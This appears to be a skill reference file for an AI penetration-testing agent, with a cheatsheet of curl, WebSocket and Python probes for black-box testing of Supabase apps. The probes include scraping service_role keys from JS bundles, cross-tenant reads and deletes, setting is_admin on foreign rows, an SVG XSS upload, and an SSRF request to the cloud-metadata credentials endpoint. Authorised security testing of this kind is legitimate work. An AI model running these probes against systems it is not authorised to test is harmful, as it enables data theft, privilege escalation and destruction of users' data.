---
name: Supabase
description: Reference for black-box testing Supabase apps covering Row Level Security, PostgREST filters, RPC SECURITY DEFINER, Storage policies, Realtime channels, GoTrue tokens, and Edge Functions.
---

# Supabase

Reference for testing Supabase-backed apps over PostgREST, Storage, GraphQL, Realtime, GoTrue, and Edge Functions. Pull this in when you see `*.supabase.co` traffic, an `apikey` header, or PostgREST-style query operators (`?id=eq.1`).

> Black-box scope: probes drive the public Supabase endpoints with anon and authenticated tokens. There is no source-code analysis step.

## Tool wiring

| Action | Tool | Notes |
|---|---|---|
| REST / RPC / Storage | `execute_curl` | Always include `apikey: <anon_or_service>` and `Authorization: Bearer <jwt>` (when authed). |
| Programmatic suite | `execute_code` | `requests` against `https://<ref>.supabase.co/rest/v1`. |
| Realtime websocket | `execute_code` | `websockets`; subprotocol `realtime`. |
| Token decode / forge | `kali_shell jwt_tool` | See `/skill jwt_attacks`. |
| Edge Functions | `execute_curl` | `https://<ref>.functions.supabase.co/<fn>`. |

## Endpoint cheatsheet

```
REST / RPC :  https://<ref>.supabase.co/rest/v1/<table>
              https://<ref>.supabase.co/rest/v1/rpc/<fn>
GraphQL    :  https://<ref>.supabase.co/graphql/v1
Realtime   :  wss://<ref>.supabase.co/realtime/v1
Storage    :  https://<ref>.supabase.co/storage/v1
Auth       :  https://<ref>.supabase.co/auth/v1
Functions  :  https://<ref>.functions.supabase.co/<fn>
```

Required headers:

```
apikey: <anon_or_service>          # project-scoped, NOT user identity
Authorization: Bearer <jwt>        # binds user context (auth.uid())
```

## Recon

### Project ref + anon key

Both leak in the JS bundle:

```
kali_shell: curl -s https://target.tld/static/js/main.*.js | grep -oE 'https://[a-z0-9]+\.supabase\.co' | sort -u
kali_shell: curl -s https://target.tld/static/js/main.*.js | grep -oE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' | head
```

Decode the JWT: its `role` claim says `anon`, `authenticated`, or `service_role`. **`service_role` in a client bundle is critical** because it bypasses RLS entirely.

### Principals

| Principal | How |
|---|---|
| Unauthenticated | Send only `apikey: <anon>`, no Authorization |
| User A / User B | Sign in via `auth/v1/token?grant_type=password` or magic link |
| Premium / Admin | If exposed via UI |
| `service_role` | Only if leaked (bundle, env file, function response) |

Sign-in:

```
execute_curl url: "https://<ref>.supabase.co/auth/v1/token?grant_type=password" method: "POST" headers: "apikey: $ANON\nContent-Type: application/json" data: '{"email":"user@example.com","password":"..."}'
```

Returns `access_token`, `refresh_token`, `user`.

### Captured-traffic workflow (proxy_brain tools)

If HTTP Traffic Capture is enabled, fingerprint and drive this from the recorded history. `redamon.search {q:"supabase.co"}` (or `{bodyq:"supabase.co"}`) surfaces the project ref and every PostgREST call the app made; `redamon.grep "eyJ"` pulls the anon/`service_role` JWTs out of captured bundles, and `redamon.get(id,"request")` shows the `apikey` header plus the `?id=eq.1`-style filters in the URL. Take a captured `/rest/v1/<table>` read into `redamon.replay` to swap principals: `headers:{"apikey":"$SERVICE_ROLE","Authorization":"Bearer $SERVICE_ROLE"}` to test a leaked service_role (RLS bypass), or mutate the filter with `query:"select=*&owner_id=eq.OTHER_UID"` / `param:{"org_id":"eq.OTHER_ORG"}` to reach another tenant's rows. `redamon.fuzz(id,"owner_id",[...])` iterates candidate UIDs over a single filter param (Intruder-style); fuzz the `apikey`/`Authorization` header positions by looping `redamon.replay` instead, since `redamon.fuzz` only walks a query param. `redamon.diff(owner_id, attacker_id)` gives the owner-vs-attacker row delta. Caveats: `redamon.replay` stays pinned to the origin host, and `proxy_brain` only see traffic that passed through the capture proxy.

## Row Level Security (RLS) probes

RLS must be enabled on every non-public table. Anti-patterns to test:

| Anti-pattern | Probe |
|---|---|
| `auth.uid() IS NOT NULL` only | Any authed user reads everything |
| Forgot UPDATE/DELETE policies | Read works, write doesn't; check both |
| Trust client-supplied column | Send `?owner_id=eq.OTHER_UID` |
| No tenant filter | Send `?org_id=eq.OTHER_ORG` |
| List policy looser than per-doc | Compare list vs single-row reads |

### Read probes

```
# Cross-user
execute_curl url: "https://<ref>.supabase.co/rest/v1/orders?select=*&owner_id=eq.OTHER_UID" headers: "apikey: $ANON\nAuthorization: Bearer $TOKEN_A"

# Cross-tenant
execute_curl url: "https://<ref>.supabase.co/rest/v1/secrets?select=*&org_id=eq.OTHER_ORG" headers: "apikey: $ANON\nAuthorization: Bearer $TOKEN_A"

# Count exposure (RLS may hide rows but counts leak)
execute_curl url: "https://<ref>.supabase.co/rest/v1/users?select=*&Prefer=count=exact" headers: "apikey: $ANON\nAuthorization: Bearer $TOKEN_A"

# Disjunction trick
execute_curl url: "https://<ref>.supabase.co/rest/v1/orders?or=(org_id.eq.MINE,org_id.is.null)" headers: "apikey: $ANON\nAuthorization: Bearer $TOKEN_A"
```

### Write probes

```
# PATCH foreign row
execute_curl url: "https://<ref>.supabase.co/rest/v1/users?id=eq.FOREIGN_UID" method: "PATCH" headers: "apikey: $ANON\nAuthorization: Bearer $TOKEN_A\nContent-Type: application/json\nPrefer: return=representation" data: '{"is_admin":true}'

# DELETE foreign row
execute_curl url: "https://<ref>.supabase.co/rest/v1/orders?id=eq.FOREIGN_ID" method: "DELETE" headers: "apikey: $ANON\nAuthorization: Bearer $TOKEN_A"

# INSERT with foreign owner
execute_curl url: "https://<ref>.supabase.co/rest/v1/orders" method: "POST" headers: "apikey: $ANON\nAuthorization: Bearer $TOKEN_A\nContent-Type: application/json" data: '{"owner_id":"OTHER_UID","amount":0}'
```

## PostgREST filter cheatsheet

```
?id=eq.1          ?id=neq.1         ?id=lt.10          ?id=gt.10
?id=in.(1,2,3)    ?email=ilike.*@evil.com
?or=(a.eq.1,b.eq.2)               ?and=(a.eq.1,b.gt.5)
?email=is.null    ?email=not.is.null
?select=*,profile(*)              # embedded relations (overfetch)
Prefer: return=representation     # echo writes
Prefer: count=exact|estimated|planned
Prefer: tx=rollback               # admin-only when enabled (do not depend on)
Range: items=0-49                 # row range
Accept-Profile: schema_name       # select PostgREST schema
```

Embedded relations probe overfetch:

```
execute_curl url: "https://<ref>.supabase.co/rest/v1/orders?select=*,user(email,role,phone),org(name,billing_email)" headers: "apikey: $ANON\nAuthorization: Bearer $TOKEN_A"
```

## RPC functions

```
POST /rest/v1/rpc/<fn>
  body: {"arg1":"val", "user_id":"FOREIGN_UID"}
```

`SECURITY DEFINER` functions execute with the **definer's** role (often the table owner) and bypass RLS unless guarded inside the function. Probes:

| Probe | Outcome |
|---|---|
| Call as anon (no Authorization) | Function visible to anon when it should be authenticated |
| Call with foreign `user_id` / `org_id` in arg | Function trusts client args over `auth.uid()` |
| Pass NULL where a check is expected | NULL bypass on equality checks |
| Pass arrays where a scalar is expected | Type coercion bypass |

## Storage probes

```
# Public bucket read
execute_curl url: "https://<ref>.supabase.co/storage/v1/object/public/<bucket>/<path>"

# Authed read
execute_curl url: "https://<ref>.supabase.co/storage/v1/object/authenticated/<bucket>/<path>" headers: "apikey: $ANON\nAuthorization: Bearer $TOKEN_A"

# List
execute_curl url: "https://<ref>.supabase.co/storage/v1/object/list/<bucket>" method: "POST" headers: "apikey: $ANON\nAuthorization: Bearer $TOKEN_A\nContent-Type: application/json" data: '{"prefix":"","limit":1000}'

# Cross-tenant signed URL replay (capture as User A, replay as User B)
```

Content-type abuse:

```
PUT /storage/v1/object/<bucket>/payload.svg  Content-Type: image/svg+xml  body: <svg onload=...>
GET the URL -> verify X-Content-Type-Options: nosniff and Content-Disposition: attachment
```

Path confusion: mixed case, URL-encoded `..`, NUL bytes. UI-side validators commonly differ from server-side normalization.

## GraphQL (pg_graphql)

Same RLS layer, different query shape. Test parity:

```
POST /graphql/v1
  {"query":"{ ordersCollection(filter:{ownerId:{eq:\"OTHER_UID\"}}){ edges { node { id total user { email } } } } }"}
```

If REST denies but GraphQL allows (or vice versa), the policies are not symmetric. See `/skill graphql` for the full GraphQL probe matrix.

## Realtime channels

```
wss://<ref>.supabase.co/realtime/v1?apikey=<ANON>&vsn=1.0.0
```

Subprotocol payload (Phoenix-style):

```
{"topic":"realtime:public:<table>","event":"phx_join","payload":{"config":{"postgres_changes":[{"event":"*","schema":"public","table":"<table>"}]},"access_token":"<JWT>"},"ref":"1"}
```

Probes:

| Probe | Outcome |
|---|---|
| Join `realtime:public:secrets` as anon | Channel auth missing |
| Subscribe to `room:OTHER_USER` as User A | Per-channel guard missing |
| Drop `access_token` after join | Per-message auth missing |
| Subscribe with cross-tenant filter | Filter args trusted |

```
execute_code language: python
import asyncio, json, websockets
async def go():
    async with websockets.connect("wss://<ref>.supabase.co/realtime/v1?apikey=$ANON&vsn=1.0.0") as ws:
        await ws.send(json.dumps({"topic":"realtime:public:secrets","event":"phx_join","payload":{"config":{"postgres_changes":[{"event":"*","schema":"public","table":"secrets"}]},"access_token":"$TOKEN_A"},"ref":"1"}))
        for _ in range(20):
            print(await ws.recv())
asyncio.run(go())
```

## Edge Functions

Deno workers, often initialized with `service_role`. Common gaps:

- Trusting `apikey` header as identity (it's a project key, not a user).
- Missing JWT verification of `Authorization`; or verifying signature without checking `aud`/`iss`/`exp`.
- CORS wildcards with credentials, reflected Authorization in responses.
- Server-side fetch of attacker-supplied URLs -> SSRF (test cloud metadata: `http://169.254.169.254/`).
- Service-role secrets in error traces.

```
# No-auth probe
execute_curl url: "https://<ref>.functions.supabase.co/sensitive-fn" method: "POST" headers: "Content-Type: application/json" data: '{}'

# Foreign-id probe
execute_curl url: "https://<ref>.functions.supabase.co/get-export" method: "POST" headers: "apikey: $ANON\nAuthorization: Bearer $TOKEN_A\nContent-Type: application/json" data: '{"user_id":"OTHER_UID"}'

# SSRF probe
execute_curl url: "https://<ref>.functions.supabase.co/fetch-url" method: "POST" headers: "apikey: $ANON\nAuthorization: Bearer $TOKEN_A\nContent-Type: application/json" data: '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
```

## Auth (GoTrue) gotchas

- Tokens often live in `localStorage` -> XSS chain to ATO. Pivot to `/skill jwt_attacks`.
- `apikey` swap: replace `<anon>` with leaked `<service_role>` in any request -> RLS bypass.
- Refresh token rotation may be missing; replay across sessions.
- Magic-link / OTP flows: see `/skill oauth_oidc` for the surrounding flow checks.

## Differential / blind enumeration

- `Prefer: count=exact` exposes counts even when row reads are denied.
- ETag / `If-None-Match` reveals existence.
- Storage timing on signed-URL probes leaks valid vs invalid keys.

## Validation shape

A clean Supabase finding includes:

1. Project ref, anon key (decoded JWT), and the role used.
2. The exact request that succeeded for the wrong principal.
3. Owner-vs-attacker side-by-side responses.
4. Which RLS policy is missing or which RPC `SECURITY DEFINER` is broken (referenced by table / function name; the missing check is inferred from the response, not from reading the policy SQL).
5. If `service_role` was leaked: the bundle URL, file offset, and a one-line diff of the leak.

## Hand-off

```
RLS gaps    -> file as Mass Assignment / IDOR
RPC abuse   -> escalate via /skill business_logic
Storage     -> /skill information_disclosure
Realtime    -> Cross-tenant subscription -> data leak
Functions   -> /skill jwt_attacks (token gaps), /skill oauth_oidc (flow gaps)
service_role leak -> CRITICAL; immediate operator notification
```
